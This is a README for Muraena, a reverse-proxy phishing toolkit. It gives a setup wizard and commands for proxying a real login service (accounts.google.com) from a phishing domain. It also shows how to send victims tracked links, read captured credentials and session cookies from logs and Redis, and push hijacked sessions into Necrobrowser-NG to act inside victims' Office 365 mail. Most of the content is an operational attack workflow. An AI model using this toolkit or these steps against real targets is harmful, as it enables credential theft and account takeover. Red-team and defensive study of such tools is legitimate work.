<p align="center">
  <img alt="Muraena Logo" src="./media/img/muraena_logo.png" height="160" /><br>
	<p align="center">
    <a href="https://github.com/muraenateam/muraena/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/muraenateam/muraena.svg?style=flat-square"></a>
    <a href="https://github.com/muraenateam/muraena/blob/master/LICENSE.md"><img alt="Software License" src="https://img.shields.io/badge/license-BSD3-brightgreen.svg?style=flat-square"></a>
    <a href="https://goreportcard.com/report/github.com/muraenateam/muraena"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/muraenateam/muraena?style=flat-square&fuckgithubcache=1"></a>
    </p>

**Muraena** is an almost-transparent reverse proxy aimed at automating phishing and post-phishing activities.

The tool re-implements the 15-years old idea of using a custom reverse proxy to dynamically interact with the
origin to be targeted, rather than maintaining and serving static pages.

---

## Quick Start

> **Requirements:** Docker + Docker Compose v2, Git, a domain pointing at your server.

```bash
git clone https://github.com/5l33m/muraena.git
cd muraena
./setup.sh
```

The interactive wizard asks six questions and handles everything else — TLS, Redis, config, and optionally Necrobrowser-NG.

---

## Step-by-Step Usage

### 1. Clone the repository

```bash
git clone https://github.com/5l33m/muraena.git
cd muraena
```

### 2. Run the setup wizard

```bash
./setup.sh
```

Answer the prompts:

| Prompt | Example |
|---|---|
| Phishing domain | `evil.example.com` |
| Target domain to proxy | `accounts.google.com` |
| TLS | `1` (Let's Encrypt), `2` (self-signed), `3` (HTTP/testing) |
| Enable tracking | `Y` |
| Enable Necrobrowser-NG | `Y` (optional) |
| Enable Telegram alerts | `Y` (optional) |

`setup.sh` will:
- Generate `config/config.toml` with all your settings
- Obtain or generate TLS certificates
- Clone and configure Necrobrowser-NG if selected
- Start everything with `docker compose up -d`

### 3. Send victims to your phishing domain

Use the tracking URL so every session is tagged:

```
https://evil.example.com/?_uid=CAMPAIGN_ID
```

### 4. Monitor captured sessions

```bash
# Live Muraena logs (credentials, cookies, session events)
make logs

# Inspect a victim's cookie jar in Redis
docker compose exec redis redis-cli hgetall victim:<ID>
```

### 5. Necrobrowser-NG (post-phishing automation)

If enabled during setup, Muraena automatically POSTs captured sessions to Necrobrowser-NG once the trigger cookies appear. Edit `config/instrument.necro` to choose the task:

```json
{
  "name": "%%%TRACKER%%%",
  "task": {
    "type": "office365",
    "name": ["OutlookWriteEmail"],
    "params": {
      "fixSession": "https://outlook.office.com/mail/inbox",
      "credentials": %%%CREDENTIALS%%%
    }
  },
  "cookies": %%%COOKIES%%%
}
```

### 6. Useful commands

```bash
make up          # start Muraena + Redis
make up-full     # start Muraena + Redis + Necrobrowser-NG
make down        # stop everything
make logs        # tail Muraena logs
make build       # compile binary locally (requires Go 1.22+)
make test        # run test suite
```

### 7. Manual install (no Docker)

```bash
# Install Go 1.22+ and Redis, then:
go build -o muraena .
redis-server &
./muraena -config config/config.toml
```

---

## Modules

| Module | Purpose |
|---|---|
| **Tracking** | Tags victims via cookie/query-string; captures credentials |
| **Necrobrowser** | Auto-instruments captured sessions in Necrobrowser-NG |
| **Watchdog** | IP / country / user-agent allow/block rules |
| **Telegram** | Real-time alerts for captured credentials and sessions |
| **StaticServer** | Serves local files under a custom URL path |
| **LoginCloner** | Clones a remote login page (HTML + assets) for hosting |

See [USAGE.md](./USAGE.md) for the full configuration reference and per-module guides.

---

## Documentation

Full documentation at https://muraena.phishing.click

---

## License

**Muraena** is made with ❤️ by [the dev team](https://github.com/orgs/muraenateam/people) and released under the <a href="https://github.com/muraenateam/muraena/blob/master/LICENSE.md"><img alt="Software License" src="https://img.shields.io/badge/license-BSD3-brightgreen.svg?style=flat-square"></a>.
